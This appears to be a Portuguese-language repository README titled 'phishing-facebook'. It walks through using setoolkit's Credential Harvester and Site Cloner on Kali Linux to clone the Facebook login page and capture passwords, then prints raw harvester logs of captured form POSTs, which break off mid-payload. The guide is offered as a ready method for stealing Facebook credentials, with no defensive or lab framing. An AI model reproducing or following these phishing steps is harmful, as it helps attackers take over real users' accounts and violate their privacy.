# phishing-facebook


Phishing para captura de senhas do Facebook
Ferramentas
Kali Linux
setoolkit
Configurando o Phishing no Kali Linux
Acesso root: sudo su
Iniciando o setoolkit: setoolkit
Tipo de ataque: Social-Engineering Attacks
Vetor de ataque: Web Site Attack Vectors
Método de ataque: Credential Harvester Attack Method 
Método de ataque: Site Cloner
Obtendo o endereço da máquina: ifconfig
URL para clone: http://www.facebook.com
Resutados


 WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                                                                                                  
                                                                                                                                                                               
                                                                                                                                                                               
192.168.205.137 - - [03/Jan/2025 20:54:26] "GET /index.html HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------703791443658075628338823997                                                                                        
Content-Disposition: form-data; name="ts"                                                                                                                                      
                                                                                                                                                                               
1735948466298                                                                                                                                                                  
-----------------------------703791443658075628338823997                                                                                                                       
Content-Disposition: form-data; name="q"                                                                                                                                       
                                                                                                                                                                               
[{"app_id":"256281040558","posts":[["falco:ods_web_batch",{"e":"{\"batch\":{\"7173\":{\"entities.ff_js_web.web_time_spent_bit_array.256281040558.0.C3\":{\"event.logged\":{\"n\":1,\"d\":null},\"event.info.upload_method.banzai.log_immediately\":{\"n\":1,\"d\":null},\"event.info.banzai.log_immediately.upload_processing\":{\"n\":1,\"d\":null},\"event.uploaded\":{\"n\":1,\"d\":null}}}}}","r":1,"d":"$^|AcabT5IC74Tr5ARkiz_QvDGB9y-Av3LGb1jj685pDRq66sNuEJYd9Kx7vQooPUoaaJCK3AtcKkHeXeZuAc67uxsAwG37-UU|fd.AcZlKJdVqIsYN3jixIsXd8TlamUxDIq_0qPqCRrV63t5k0mK7LVzuAcnmfkzFVizNUrXWUX7f47dO-y-jhA5ZT8m","s":"navnq3:ay7291:61oou4","t":1735948449976.7,"b":[1,128]},1735948463674,0,590]],"user":"0","webSessionId":"navnq3:ay7291:61oou4","send_method":"beacon","compression":""}]                                                                                                                  
-----------------------------703791443658075628338823997--                                                                                                                     
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                                                                                                  
                                                                                                                                                                               
                                                                                                                                                                               
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------13581929164011185411574609949                                                                                      
Content-Disposition: form-data; name="ts"                                                                                                                                      
                                                                                                                                                                               
1735948466305                                                                                                                                                                  
-----------------------------13581929164011185411574609949                                                                                                                     
Content-Disposition: form-data; name="q"                                                                                                                                       
                                                                                                                                                                               
[{"app_id":"256281040558","posts":"nwnwVFtbImZhbGNvOndlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvbiIseyJlIjoie1wianNvbl9kYXRhXCI6XCJ7XFxcInNvdXJjZV9wYXRoXFxcIjoBFEhYV2ViTG9naW5Db250cm9sbGVyARcALAEFDTAQdG9rZW4BEAA6AQUcOTZlODhhZjMBDAUmDGRlc3QZVAxudWxsGRcZOxUYEGNhdXNlAT0FThR1bmxvYWQBDwU1GHNpZF9yYXcBEAUfTG5hdm5xMzpheTcyOTE6NjFvb3U0AR0ALAEFPGNsaWNrX3BvaW50X2luZm8BFAQ6ewEGEGNsYXNzAQkFRRBfOWxzYQEOAH0FNw3WFGVmX3BhZwmKFZ0NHAh1cmkBMAU+ZGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sITYMLnBocAEr8NR9XCJ9IiwiciI6MSwiZCI6IiRefEFjYWJUNUlDNzRUcjVBUmtpel9RdkRHQjl5LUF2M0xHYjFqajY4NXBEUnE2NnNOdUVKWWQ5S3g3dlFvb1BVb2FhSkNLM0F0Y0trSGVYZVp1QWM2N3V4c0F3RzM3LVVVfGZkLkFjWmxLSmRWcUlzWU4zaml4SXNYZDhUbGFtVXhESXFfMHFQcUNSclY2M3Q1azBtSzdMVnp1QWNubWZrekZWaXpOVXJYV1VYN2Y0N2RPLXktamhBNVpUOG0iLCJzIjpSfwGIIiwidCI6MTczNTk0ODQ1MjYwNy43LCJiIjpbMSwxMjhdfSwRHTw2NjMwNCwwLDY0M10sWyJmVcEAdFm8IGJpdF9hcnJheV27UQYMIjpcIlICAiAiLFwic3RhcnQFSgBcHY8YOSxcInRvcwlTJFwiOlsyNDcsMF0NFghjdW0BLQA1DQ8IaWRcAWMENjFFVwFVATsYbGVuXCI6OA0kCHNlcQEz/t0B/t0B/t0B/t0BZt0BEDQyMV1d","user":"0","webSessionId":"navnq3:ay7291:61oou4","send_method":"beacon","compression":"snappy_base64","snappy_ms":2}]                                                                                                   
-----------------------------13581929164011185411574609949--                                                                                                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                                                                                                  
                                                                                                                                                                               
                                                                                                                                                                               
192.168.205.137 - - [03/Jan/2025 20:54:26] "GET /favicon.ico HTTP/1.1" 404 -
192.168.205.137 - - [03/Jan/2025 20:55:13] "GET /index.html HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------24955226064481792803789143373                                                                                      
Content-Disposition: form-data; name="ts"                                                                                                                                      
                                                                                                                                                                               
1735948516076                                                                                                                                                                  
-----------------------------24955226064481792803789143373                                                                                                                     
Content-Disposition: form-data; name="q"                                                                                                                                       
                                                                                                                                                                               
[{"app_id":"256281040558","posts":"9QnwVFtbImZhbGNvOndlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvbiIseyJlIjoie1wianNvbl9kYXRhXCI6XCJ7XFxcInNvdXJjZV9wYXRoXFxcIjoBFEhYV2ViTG9naW5Db250cm9sbGVyARcALAEFDTAQdG9rZW4BEAA6AQUcOTZlODhhZjMBDAUmDGRlc3SmVAAFLnpSADBpbXByZXNzaW9uX2lkAWgFeUAxWGQ5aWxZdjZvVVNSbGhUegEaBYIQY2F1c2UBDgUoCGxvYQU1BRsYc2lkX3JhdxUdTGNqa3NwejpheTcyOTE6NnUwdmhhAR0ALAEFDfAUZWZfcGFnCVEMbnVsbC4cAAh1cmkBKgVpZGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sIVAMLnBocAErBT4F9lJYAAUa2lYADbAYcmVzdG9yZQX18Nw6dHJ1ZX1cIn0iLCJyIjoxLCJkIjoiJF58QWNhYlQ1SUM3NFRyNUFSa2l6X1F2REdCOXktQXYzTEdiMWpqNjg1cERScTY2c051RUpZZDlLeDd2UW9vUFVvYWFKQ0szQXRjS2tIZVhlWnVBYzY3dXhzQXdHMzctVVV8ZmQuQWNabEtKZFZxSXNZTjNqaXhJc1hkOFRsYW1VeERJcV8wcVBxQ1JyVjYzdDVrMG1LN0xWenVBY25tZmt6RlZpek5VclhXVVg3ZjQ3ZE8teS1qaEE1WlQ4bSIsInMiOiJjaka7AYgiLCJ0IjoxNzM1OTQ4NDM1MzQ3LjIsImIiOlsxLDEyOF19LA0dNDUxNTA3NCwwLDc4NF0sLk4DTHBlcmZfZGV2aWNlX2luZm9fbG9nfUhQY3B1X2NvcmVzXCI6MixcInJhbVwiTRigImdwdV9yZW5kZXJlclwiOlwibGx2bXBpcGUsIG9yIHNpbWlsYXJcIiwJKhB2ZW5kbwkoDE1lc2H+pgH+pgH+pgHmpgEIODkuYqYBKDExMSwwLDM2Nl1d","user":"0","webSessionId":"cjkspz:ay7291:6u0vha","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":"snappy_base64","snappy_ms":1}]                
-----------------------------24955226064481792803789143373--                                                                                                                   
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                                                                                                  
                                                                                                                                                                               
                                                                                                                                                                               
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------23177284721361354453476205873                                                                                      
Content-Disposition: form-data; name="ts"                                                                                                                                      
                                                                                                                                                                               
1735948524091                                                                                                                                                                  
-----------------------------23177284721361354453476205873                                                                                                                     
Content-Disposition: form-data; name="q"                                                                                                                                       
                                                                                                                                                                               
[{"app_id":"256281040558","posts":"jwuAW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiMjk2NgkKTG1zLnRpbWVfc3BlbnQucWEud3d3CRodF0hiaXRzLmpzX2luaXRpYWxpemVkCSQcblwiOjEsXCIBDzRudWxsfX19LFwiNzE3MwkgMGVudGl0aWVzLmZmX2oFlgAuBZoMbHVlXxlgbF9uYXZpZ2F0aW9uLjI1NjI4MTA0MDU1OC4wLkMRSQB2AZ8MbG9nZ2J7AAgsXCIJJmBpbmZvLnVwbG9hZF9tZXRob2QuYmFuemFpAUAwX2ltbWVkaWF0ZWx5XCUMQsQANkkAVjsAEWAkcHJvY2Vzc2luZ35NAAmRYr4ABXZWLgEscGVyZl9kZXZpY2VfAdwMX2xvZ/4oATUoGd8Nov7TAB3T9CABfX19IiwiciI6MSwiZCI6IiRefEFjYWJUNUlDNzRUcjVBUmtpel9RdkRHQjl5LUF2M0xHYjFqajY4NXBEUnE2NnNOdUVKWWQ5S3g3dlFvb1BVb2FhSkNLM0F0Y0trSGVYZVp1QWM2N3V4
